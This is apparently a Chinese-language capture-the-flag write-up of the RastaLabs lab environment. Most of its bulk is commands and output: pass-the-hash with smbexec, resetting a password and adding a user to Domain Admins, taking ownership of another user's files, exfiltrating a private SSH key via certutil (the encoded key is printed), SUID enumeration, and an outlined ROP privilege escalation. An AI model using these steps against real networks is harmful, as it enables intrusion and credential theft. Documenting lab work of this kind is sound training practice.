Microsoft Windows [Version 10.0.19045.3448]
(c) Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
rlab\bowen
```

```plain
# 1. 设置执行策略为 Bypass（当前会话）
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# 2. 导入模块
Import-Module 'C:\ProgramData\Microsoft OneDrive\FileCryptography.psm1'

# 3. 解密文件
$key = Get-Content 'C:\ProgramData\Microsoft OneDrive\key.txt' | ConvertTo-SecureString -Force
Unprotect-File 'C:\ProgramData\Microsoft OneDrive\secret.AES' -Algorithm AES -Key $key

# 4. 查看结果
dir 'C:\ProgramData\Microsoft OneDrive\' -Force
```

### Getflag
```plain
PS C:\Windows> type "C:\ProgramData\Microsoft OneDrive\secret"
type "C:\ProgramData\Microsoft OneDrive\secret"
RASTA{cryp70_3xf1l7r4710n}
```

## SQL01-10.10.122.15
```plain
proxychains -q xfreerdp /u:heathc1iff /p:'Pass@123' /d:RASTALABS /v:10.10.122.15 /cert:ignore
```

### 获取权限
```plain
takeown /f "C:\Users\epugh_adm\Desktop\flag.txt" /a
icacls "C:\Users\epugh_adm\Desktop\flag.txt" /grant heathc1iff:F
```

```plain
┌─────────────────────────────────────────────────────────────────┐
│  heathc1iff 是 BUILTIN\Administrators 组成员                     │
│                                                                 │
│  → 本地管理员可以：                                              │
│    • 使用 takeown 获取任何文件所有权                              │
│    • 使用 icacls 修改任何文件 ACL                                │
│    • 访问其他用户的文件（即使有权限保护）                          │
└─────────────────────────────────────────────────────────────────┘
```

| 机制 | 说明 |
| --- | --- |
| SeTakeOwnershipPrivilege | 管理员可以获取任何对象的所有权 |
| SeBackupPrivilege | 管理员可以绕过文件读取权限 |
| SeRestorePrivilege | 管理员可以绕过文件写入权限 |
| ACL 修改 | 所有者可以修改文件的访问控制列表 |


### Getflag
```plain
type "C:\Users\epugh_adm\Desktop\flag.txt"
RASTA{c00k1n6_w17h_645_n0w}
```

### 查看进程
```plain
*Evil-WinRM* PS C:\Users\epugh_adm\DEsktop> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    295      12     1872       4412       0.41    396   0 csrss
    119       8     1312       3788       0.44    512   1 csrss
    215      13     3616      12644       0.16   2760   0 dllhost
    310      19    15516      32232       0.55    384   1 dwm
      0       0        0          4                 0   0 Idle
    411      24     9372      43432       0.56   2712   1 LogonUI
   1008      30     5912      17068       3.53    640   0 lsass
    192      13     2596       9796       0.05   3008   0 msdtc
    296      11     4188       9736       1.22    632   0 services
     51       2      384       1196       0.20    300   0 smss
    420      22     5572      16264       0.11   1696   0 spoolsv
    540      74   227064     133120       0.97   3196   0 sqlservr
    108       9     1516       7728       0.00   1820   0 sqlwriter
    131       9     2136       8856       0.03    176   0 svchost
    176      14     1640       6920       0.06    392   0 svchost
    630      51     8268      22172       1.11    420   0 svchost
    262      19     7712      19612       0.44    620   0 svchost
    507      17     4988      14072       0.63    732   0 svchost
    455      15     3124       8968       0.69    792   0 svchost
    438      18     4060      11888       0.17    900   0 svchost
   1321      50    22832      50020      13.83    924   0 svchost
    414      17    10932      16020       1.47    928   0 svchost
    787      28     7092      18300       0.50    936   0 svchost
    461      28     9908      17768       0.25    980   0 svchost
    436      34    12548      19000       0.78   1108   0 svchost
    167      10     1668       7012       0.05   1148   0 svchost
    347      19     8152      21404       0.64   1780   0 svchost
    200      11     2040       8280       0.16   1792   0 svchost
    135      10     1744       7020       0.05   2440   0 svchost
    788       0      124        140      11.19      4   0 System
    137      11     2672      10872       0.05   1912   0 VGAuthService
    124       7     1580       6156       0.03   1900   0 vm3dservice
    121       8     1740       6756       0.14   2152   1 vm3dservice
    370      23    10196      23348       1.48   1944   0 vmtoolsd
     98       8      948       5060       0.08    504   0 wininit
    171      11     2960      13840       1.53    564   1 winlogon
    336      17     8960      19548      10.27   3024   0 WmiPrvSE
    916      28    70716      88428       0.78    540   0 wsmprovhost
```

发现sqlserver程序正在启动

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbexec rweston_da@10.10.122.15 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

### Mssql
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbexec rweston_da@10.10.122.15 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>sqlcmd -S 10.10.122.15 -E -Q "SELECT name FROM sys.databases"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
umbraco                                                                                                                         

(5 rows affected)
```

尝试rdp但是rdp不上去，看了下wp发现<font style="color:rgb(57, 58, 52);background-color:rgba(17, 17, 51, 0.02);">epugh_adm对sqlserver有权限，</font>直接在域控给<font style="color:rgb(57, 58, 52);background-color:rgba(17, 17, 51, 0.02);">epugh_adm提权</font>

```plain
net user epugh_adm NewPass123! /domain

# 将 epugh_adm 添加到 Domain Admins 组
Add-ADGroupMember -Identity "Domain Admins" -Members "epugh_adm"

# 或使用 net group 命令
net group "Domain Admins" epugh_adm /add /domain
```

### evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q evil-winrm -i 10.10.122.15 -u epugh_adm -p 'NewPass123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\epugh_adm\Documents> 
```

### MSSQLSERVER$
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbexec rweston_da@10.10.122.15 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>sc qc MSSQLSERVER
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: MSSQLSERVER
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : SQL Server (MSSQLSERVER)
        DEPENDENCIES       : 
        SERVICE_START_NAME : RLAB\MSSQLSERVER$
```

我们发现mssql是有mssqlserver$机器账户所启动，因此直接secretsdump拿到密码也可以获得mssql权限

### Getflag
```plain
*Evil-WinRM* PS C:\Users\epugh_adm\Documents> sqlcmd -S 10.10.122.15 -E -d umbraco -Q "SELECT * FROM dbo.Flag"
 
flag
--------------------------------------------------
RASTA{d474b4535_4r3_u5u4lly_1n73r3571n6}

(1 rows affected)
```

## SQL02-10.10.122.25
### smbexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbexec rweston_da@10.10.122.25 -hashes :3ff61fa259deee15e4042159d7b832fa
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

### Getflag
```plain
C:\Windows\system32>type C:\Users\acronis_backup\Desktop\flag.txt
RASTA{n3v34_br34k_7h3_ch41n}
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
RASTA{n4m3d_p1p3_53cur17y_f7w}
```

## FS01-10.10.120.5 
这台机器的入口在 FS01 上 ahope 的家目录里：

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q evil-winrm -i 10.10.120.5 -u heathc1iff -p 'Pass@123'         
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\heathc1iff\Documents>
```

### 挂载<font style="color:rgb(0, 0, 0);">ahope</font>
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q impacket-smbexec rweston_da@10.10.120.5 -hashes :3ff61fa259deee15e4042159d7b832fa 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>net user ahope /domain
The request will be processed at a domain controller for domain rastalabs.local.

User name                    ahope
Full Name                    Amber Hope
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            04/06/2025 09:11:16
Password expires             Never
Password changeable          05/06/2025 09:11:16
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\fs01.rastalabs.local\home$\ahope
Last logon                   17/03/2026 05:19:57

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Human Resources      *Domain Users         
The command completed successfully.
```

### nix01.ppk
#### 目录
```plain
C:\Windows\system32>dir \\fs01.rastalabs.local\home$\ahope\Desktop
 Volume in drive \\fs01.rastalabs.local\home$ has no label.
 Volume Serial Number is 0E71-8F3D

 Directory of \\fs01.rastalabs.local\home$\ahope\Desktop

30/08/2021  10:22    <DIR>          .
30/08/2021  10:22    <DIR>          ..
15/10/2018  18:33             1,444 nix01.ppk
               1 File(s)          1,444 bytes
               2 Dir(s)   4,059,856,896 bytes free
```

#### 提取
```plain
certutil -encode \\fs01.rastalabs.local\home$\ahope\Desktop\nix01.ppk nix01_encoded.txt

C:\Windows\system32>type nix01_encoded.txt
-----BEGIN CERTIFICATE-----
UHVUVFktVXNlci1LZXktRmlsZS0yOiBzc2gtcnNhDQpFbmNyeXB0aW9uOiBub25l
DQpDb21tZW50OiANClB1YmxpYy1MaW5lczogNg0KQUFBQUIzTnphQzF5YzJFQUFB
QUJKUUFBQVFFQXhZRjlYWnRxZnZpMkdyb21oL2tCaTlkaUJhVXMvNUJQWERYcA0K
VlZ2NGtLVldaQU4yZDFBRW93Rzc1UGxWOCtrbkxleFg4MFVXbFpGS0crU3U4T1I5
d1JFMWgrUlNhSHhGeWk5eQ0KMlhUT2pzT1cwRVhKWTJxbHJhU01MNHJLN1VUNUlD
TUJuQUxIZVRTaHJPK1R3WHQvZzVWYnJEQlpCWW1mYUczTA0KR3E0Q05Rc3FEUXp4
Qjk1YWFrblNaUXMxV0FUcFJQRDBDdHo5a3NBWFJicFlDN2RsNTJkNC9ONCt0ajhs
WmxvKw0KL0dKbTdVZlI1MEEvUllINWxsTHNDN3RxV2FRcTZQb094V3puaTkzSkJw
SWVPMHNyTWNEY0RNbkhweVY0WlFONA0KZFlsaTFFTTZkVWNuV1lqajhQQ0xSRHRG
WXJnZnBUOUttbFp5ZVdudTFNaGlRaEFKY3c9PQ0KUHJpdmF0ZS1MaW5lczogMTQN
CkFBQUJBQ1Zkcis4ZFp5ekhSUXY1dEVNODhuUm5CTFQxdkdlemhLSytGMk10RTFt
aXZWRXhGbW1aaEZZd3dxN0gNClkwblNLZ0hFN2d0dDc0UVVrWHJtRTBKVXZkaHJD
aUNnMFZJSnJGYXZCK1B6Z1FaQXJkUmdPdHQxQ3BaNUU1cEsNCnNNVWE0d1lVZGUw
VlNGVXplSWlBV2psY2piN3l2bEVDT2xyK1hHMno2Q2VrWVVoTjRzOG91QzBSS2tN
aEpwNFUNCnJrYVZPcDFWMndka3Y3TWxMWVQyK2dzWjhSME41MmdUWTZ2Vjc3SzVZ
dkM3eTlHSmsrZ2R0UFFHK09ncTNSSmMNCnBIcDYvL0QxclNsb3JSQXR1cFpqTUVM
djhiOE9MZHUxYW9NL0lOT0txWFZER082VGxwVVpyMFMvd1hJcGtyTnoNCnVOWFlP
cW85eW5UUmhlcWs4R05QOGRhTzUzMEFBQUNCQVBxRHduTFIrd3JiUy9sTDlYOWVB
L3ZQcXpkczdFcG4NCjBDZU1aU2dsdjl1cG50UkxFOXVkTHY2aThzY3V1QlFqUjNt
aVA2M3gxNHJ3eTZQLzZuTGdENzczTWlidEcrS28NCkdkWDVKSENRRVVnOHprOVNZ
enI1RUR0SElKQ05QWWlSamszQ1p6VWxuWGxvNDNJNnA4N2NPQkZUMmQ1YmhuV3QN
Cm01SFJCUFJzcnpDckFBQUFnUURKMUpmVlI2MG5CNWZEMVlQVHFYNXVmc2tTVWtu
aWVBYmFqTTRHUFpMOWY2TzQNCitXUG1qTW5xcFFGSVF1NUNDTHR2REdPTHQ0V1VJ
NEFsUFF2Yk8xTnNRVWVkdEV4TmpqLzBPNnFLQUVXY0F4VlINCk1SVlpyelZHZHBo
RG9RM0VNUmFIbnNYbUVheTFMSjhSbmkvS0hDMnpxUG8rSG55Q0dCMW1aSXFVSGlS
YVdRQUENCkFJRUEzQTVJd3hWWkc3bUx1aHdxMThUYTQ5NG50R0JMZmQ4RUZqbG9U
dWdmMWNHckUwcjZCYW16aTE2YTZ1Ry8NCmMzelppWXc1VHFLbCtHMzNyN2Q5c00x
b0pVc3NYOWZFeXZRcXVPd20yek04Qk5PNCsvdWR1UHFKeEFwZEgyRnANCitFV2tU
c2JRb3BSL0lpK2crdm5SR05jT1hublY5U1ZBc3prNTNxaHN5bkVzcTRBPQ0KUHJp
dmF0ZS1NQUM6IGZiNjk1OGZjODAwYzIxYzc0ZWQ2ZTRiZGFkZDAzN2IyNjMyYjY4
YWUNCg==
-----END CERTIFICATE-----
```

### 格式更改
<font style="color:rgb(6, 10, 38);">你当前的</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">nix01.ppk</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">文件</font>**<font style="color:rgb(6, 10, 38);">被错误地封装成了 PEM 证书格式</font>**<font style="color:rgb(6, 10, 38);">（带有</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">-----BEGIN CERTIFICATE-----</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">头）。</font>

+ <font style="color:rgb(6, 10, 38);">里面的 Base64 内容解码后才是真正的</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">.ppk</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">文件内容。</font>
+ `<font style="color:rgb(6, 10, 38);">puttygen</font>`<font style="color:rgb(6, 10, 38);"> 无法识别这种“证书外壳”，因为它期望直接看到 </font>`<font style="color:rgb(6, 10, 38);">PuTTY-User-Key-File-2:</font>`<font style="color:rgb(6, 10, 38);"> 开头的内容。</font>

<font style="color:rgb(6, 10, 38);">使用 </font>`<font style="color:rgb(6, 10, 38);">sed</font>`<font style="color:rgb(6, 10, 38);"> 去掉头尾，再用 </font>`<font style="color:rgb(6, 10, 38);">base64</font>`<font style="color:rgb(6, 10, 38);"> 解码：</font>

```plain
# 1. 去掉首尾行，提取纯 Base64 内容，然后解码保存为真正的 ppk 文件
sed '1d;$d' nix01.ppk | base64 -d > nix01_real.ppk
```

### <font style="color:rgb(6, 10, 38);">转换为 OpenSSH 格式</font>
```plain
puttygen nix01_real.ppk -O private-openssh -o nix01-id_rsa
chmod 600 nix01-id_rsa
```

## NIX01-10.10.122.20
### ssh登录
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q ssh -i nix01-id_rsa ahope@10.10.122.20                
The authenticity of host '10.10.122.20 (10.10.122.20)' can't be established.
ED25519 key fingerprint is: SHA256:O1EbpY5bzALU/FqM0cCoqwHkXBtpuFFYCHP678JYTFg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.122.20' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 17 Mar 11:28:07 GMT 2026

  System load:  0.0               Processes:               205
  Usage of /:   69.5% of 4.76GB   Users logged in:         0
  Memory usage: 10%               IPv4 address for ens160: 10.10.122.20
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

ahope@nix01:~$ 
```

### SUID
```plain
ahope@nix01:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/snapd/20290/usr/lib/snapd/snap-confine
/snap/snapd/21759/usr/lib/snapd/snap-confine
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudo
/usr/bin/chsh
```

###  paycalc缓冲区溢出
```plain
ahope@nix01:~$ dir  /usr/local/sbin/
paycalc
```

后面属于二进制范围

+ `scp` 把 `/usr/local/sbin/paycalc` 拉到本地
+ `checksec` 看保护
+ 用 `NOTES` 缓冲区的格式化字符串漏洞泄露栈地址
+ 做 ROP，最后拿 root

```plain
cat /root/flag.txt
```

拿到

```plain
RASTA{y0ur3_4_b4ll3r_70_637_7h15}
```

